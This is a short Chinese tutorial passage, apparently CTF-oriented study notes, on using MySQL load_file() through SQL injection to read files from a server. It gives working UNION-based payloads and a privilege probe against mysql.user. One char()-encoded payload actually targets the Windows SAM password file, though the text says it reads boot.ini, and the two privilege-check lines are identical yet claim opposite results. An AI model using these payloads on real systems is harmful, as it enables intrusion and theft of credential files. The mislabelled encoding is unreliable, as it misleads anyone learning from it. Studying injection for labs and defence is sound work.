# SQL注入总结(三)

参考：BUUCTF-Sqli_Labs/ [SQL注入天书](https://xz.aliyun.com/t/385#toc-10)  
非常好的SQL注入文章，本文只是对它的拙劣总结  
想掌握注入，实战永远比理论重要。  
$ 在文章中代表可控变量  
要求读者掌握基本的SQL语法知识  
[堆叠注入和神奇的存储过程绕过](https://blog.csdn.net/weixin_40871137/article/details/94349532)  
[SQLMap的使用](https://www.freebuf.com/sectool/164608.html)

## 文件的导入导出

### Load_File()函数

读取文件并且返回该文件的内容作为一个字符串。如果文件不存在或不能读取，函数返回为空。使用有以下的限制条件： 

1. 必须有权限读取并且文件必须完全可读  
2. 欲读取文件必须在服务器上  
3. 必须指定文件完整的路径  
4. 欲读取文件必须小于 max_allowed_packet  

查看文件权限的方式：

```sql
and (select count(*) from mysql.user)>0--如果结果返回正常,说明具有读写权限。  
and (select count(*) from mysql.user)>0--返回错误，应该是管理员给数据库帐户降权  
```

要获得路径是一个难点。[常用路径](http://www.cnblogs.com/lcamry/p/5729087.html)  

#### 导出文件示例

`Select 1,2,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))`  
其中，char里面的字符是`c:/boot.ini`的字符代码。  

#### 另一个示例

`-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)`  
其中0x那一串数就是`c:/boot.ini`的十六进制。

#### 这样写偶尔也可以

`-1 union select 1,1,1,load_file(c:\\boot.ini)`  
路径里的 / 用 \\\\ 代替。

